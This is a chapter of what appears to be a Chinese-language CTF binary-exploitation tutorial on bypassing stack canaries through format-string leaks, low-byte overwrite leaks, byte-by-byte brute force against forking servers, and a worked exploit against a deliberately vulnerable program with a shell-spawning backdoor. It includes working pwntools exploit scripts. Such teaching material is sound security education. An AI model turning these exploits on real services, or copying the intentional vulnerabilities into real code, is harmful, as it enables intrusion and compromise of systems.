# 第 12 章 Canary 绕过：与哨兵周旋

> 栈上多了一个随机哨兵，函数返回前会检查它。硬冲是冲不过去的——但哨兵也是数据，只要你能读到它，就能把它原样放回去。

---

## 12.1 Canary 的检查机制回顾

第 7 章讲过，Canary 的实现是这样的：

```text
栈布局：
[ 局部变量 ][ Canary ][ 保存的 rbp ][ 返回地址 ]
```

函数返回前执行：

```asm
mov  rax, [rbp-0x8]          ; 取出栈上的 Canary
xor  rax, [fs:0x28]          ; 与 TLS 里的原始值比较
jne  __stack_chk_fail        ; 不同 → 程序终止
```

**关键点**：Canary 每次程序启动都随机生成（从 TLS 的 `fs:0x28` 读取），所以你无法提前知道它的值。但如果你能在**同一次运行**中读出它，就能在 payload 里原样填回去，骗过检查。

> 💡 **提示**：Canary 的最低字节通常是 `\x00`（防止被字符串函数泄露），共有 7 字节随机数 + 1 字节 0。在 64 位下，Canary 占 8 字节。

---

## 12.2 绕过思路一：泄露 Canary

### 12.2.1 用格式化字符串泄露

如果程序同时有格式化字符串漏洞和栈溢出，泄露 Canary 就很简单：

```c
void vulnerable() {
    char buf[64];
    gets(buf);
    printf(buf);              // 格式化字符串漏洞！
}
```

`printf(buf)` 会把 buf 当作格式字符串。通过 `%p` 可以打印栈上的值。Canary 在栈上的位置相对固定，我们可以通过枚举栈上的值来找到它：

```python
# 用 %p 打印栈上前 20 个值
payload = b'|'.join([b'%p'] * 20)
p.sendline(payload)
output = p.recvline()
# 输出类似：0x7fff...|0x401234|0x7f...|0x61616161...|0x1234567890
```

Canary 的特征：**低 1 字节为 0，高 7 字节随机**（形如 `0x1234567890abcdef` 但最低两位是 `00`）。在输出中寻找符合这个模式的值。

找到后，用 `%N$p`（N 是偏移量）精确地泄露它：

```python
payload = b'%7$p'   # 假设 Canary 在第 7 个参数位置
p.sendline(payload)
leak = int(p.recvline().strip(), 16)
```

然后在栈溢出 payload 里把 Canary 填回去：

```python
payload = flat({
    0: b'A' * 64,        # 填充 buf
    64: p64(canary),     # 原样填回 Canary
    72: p64(fake_rbp),   # 保存的 rbp
    80: rop_chain        # 返回地址和 ROP 链
})
```

### 12.2.2 用越界读泄露

如果程序有一个「先读后写」的模式，比如：

```c
char buf[64];
read(0, buf, 200);    // 可以写超长，覆盖 Canary
printf("%s", buf);    // 打印出来（遇到 \0 停止）
```

因为 Canary 最低字节是 `\x00`，`printf("%s")` 会在那里停止，无法直接泄露。但如果你能覆盖 Canary 的最低字节（把它改成非 0），就能让字符串继续打印，从而泄露剩余 7 字节：

1. 第一次：覆盖 Canary 低字节为 `\x41`，发送后程序打印出 Canary 的 7 字节（因为不再以 0 结尾）
2. 接收泄露的 7 字节，加上 `\x00` 恢复完整 Canary
3. 第二次：在 payload 里填回完整 Canary，实现利用

这叫 **Canary 低字节覆盖泄露**。

---

## 12.3 绕过思路二：逐字节爆破

有些程序没有格式化字符串漏洞，也没有越界读，但它是一个**网络服务**，每次连接会 `fork()` 出一个子进程。

`fork()` 的特性：**子进程继承父进程的内存，包括 Canary 的值**。所以每次连接的 Canary 都一样！这给了我们逐字节爆破的机会。

### 12.3.1 爆破原理

Canary 有 7 个随机字节（最低字节是 `\x00`）。逐字节猜测：

1. 发送 payload，在 Canary 的第 N 个字节填入猜测值
2. 如果猜对了，程序不会在 Canary 检查处崩溃（可能因为其他原因崩溃，但错误类型不同）
3. 如果猜错了，程序调用 `__stack_chk_fail` 崩溃
4. 通过程序的反应（是否输出特定信息、是否崩溃）判断是否猜对

每个字节有 256 种可能，7 个字节最多 7 × 256 = 1792 次尝试。对本地服务来说很快。

### 12.3.2 爆破脚本

```python
from pwn import *

context.log_level = 'error'   # 避免大量输出

def brute_canary(offset, known=b''):
    """逐字节爆破 Canary"""
    canary = known
    for i in range(7):
        for guess in range(256):
            p = remote('127.0.0.1', 9999)
            payload = b'A' * offset + canary + bytes([guess])
            p.sendline(payload)
            output = p.recvall(timeout=0.5)
            p.close()
            
            # 如果程序没有崩溃（或没输出 "stack smashing detected"）
            # 说明这个字节猜对了
            if b'stack smashing' not in output:
                canary += bytes([guess])
                log.success(f'byte {i}: {hex(guess)}')
                break
        else:
            log.error(f'failed at byte {i}')
            return None
    
    # 加上最低字节 \x00
    return u64(canary + b'\x00')

canary = brute_canary(64)
log.success(f'Canary: {hex(canary)}')
```

> ⚠️ **注意**：如果服务每次连接都重新生成 Canary（比如每次都 execve 新进程），爆破就行不通。判断方法：连续爆破两次，看得到的值是否相同。

---

## 12.4 绕过思路三：不覆盖 Canary

### 12.4.1 利用栈上的其他数据

Canary 只保护它自己到返回地址之间的路径。如果漏洞不覆盖 Canary，而是覆盖 **Canary 之上**的数据（比如函数的局部变量指针），有时也能达到利用效果。

例如：

```c
void func() {
    char buf[64];
    char *ptr;         // 在 Canary 之上（更高地址）
    gets(buf);
    strcpy(ptr, "something");
}
```

如果你能覆盖 `ptr` 而不覆盖 Canary（通过索引操作而不是线性溢出），就能实现任意地址写。

### 12.4.2 利用 __stack_chk_fail

当 Canary 检查失败时，程序会调用 `__stack_chk_fail`。这个函数的行为在某些情况下可以被利用：

- 如果 `__stack_chk_fail` 的 GOT 表可写（Partial RELRO），可以把它覆写成其他函数
- 如果 `__stack_chk_fail` 的参数（通过 TLS 传递）可以被控制

这些是高级技巧，入门阶段了解即可。

### 12.4.3 覆盖 TLS 中的 Canary

Canary 的「原始值」存储在 TLS 的 `fs:0x28`。如果能写到这个位置（比如通过某些任意写漏洞），就能把原始值改成你控制的，从而让伪造的 Canary 通过检查。

---

## 12.5 实战：格式化字符串 + Canary + 栈溢出

来看一个经典的综合例题：

```c
// canary_challenge.c
#include <stdio.h>
#include <string.h>

void backdoor() {
    system("/bin/sh");
}

void vulnerable() {
    char buf[64];
    long canary = *(long *)0x28;  // 伪代码，实际由编译器插入
    
    printf("Input: ");
    read(0, buf, 200);            // 栈溢出（会覆盖 Canary）
    printf(buf);                  // 格式化字符串漏洞
    printf("You said: %s\n", buf);
    
    if (canary != *(long *)0x28)  // 伪代码，实际是编译器插入的检查
        __stack_chk_fail();
}
```

利用步骤：

**第一步：泄露 Canary**

```python
p = process('./canary_challenge')

# 用格式化字符串泄露栈上的值，先找出 Canary 的偏移
p.sendlineafter(b'Input: ', b'%7$p|%8$p|%9$p')
output = p.recvline()
# 假设 %9$p 输出的是 Canary（形如 0x123456789abcdef00）
canary = int(output.split(b'|')[2].strip(), 16)
```

**第二步：构造绕过 Canary 的栈溢出 payload**

```python
offset = 72        # 到 Canary 的偏移（buf[64] + 填充 8）
ret_addr_offset = 88  # 到返回地址的偏移（Canary 8 + rbp 8）

payload = flat({
    0: b'A' * offset,
    offset: p64(canary),          # 原样填回 Canary
    offset + 8: p64(0),           # 伪造的 rbp（无所谓）
    offset + 16: p64(backdoor_addr)  # 返回地址指向后门
})

p.sendlineafter(b'Input: ', payload)
p.interactive()
```

---

## 12.6 常见坑

1. **Canary 的偏移量**：不一定正好是 `buf` 大小，编译器可能插入对齐填充。用 gdb 观察 `[rbp-0x8]` 和 buf 地址的关系。
2. **Canary 最低字节是 0**：在爆破时要加上 `\x00`；在泄露时要注意字符串函数在遇到 0 时会停止。
3. **爆破时的判断条件**：不要用「是否崩溃」作为唯一标准，因为缓冲区溢出本身就可能崩溃。用「是否输出 stack smashing detected」来判断 Canary 检查是否失败。
4. **PIE 开启时**：Canary 的偏移不受 PIE 影响（它在栈帧里的相对位置固定），但后门函数的地址需要先泄露 PIE 基址。

---

## 12.7 小结

这一章我们学了三种绕过 Canary 的方法：

- **泄露 Canary**：用格式化字符串或越界读获取 Canary 的值，然后在 payload 里原样填回
- **逐字节爆破**：利用 fork 服务中 Canary 不变的特性，逐字节猜测（最多 1792 次）
- **不覆盖 Canary**：通过覆盖其他数据或利用 `__stack_chk_fail` 来绕过

Canary 的本质是「随机但可被读取」，所以只要你有信息泄露，它就形同虚设。这也是 PWN 的一条黄金法则：**信息泄露往往是利用的第一步**。

下一章我们学习栈迁移——当栈空间不够放 ROP 链时，如何把栈「搬」到别的地方。

---

**下一章**：[栈迁移：当栈不够用时](./ch13-栈迁移.md)
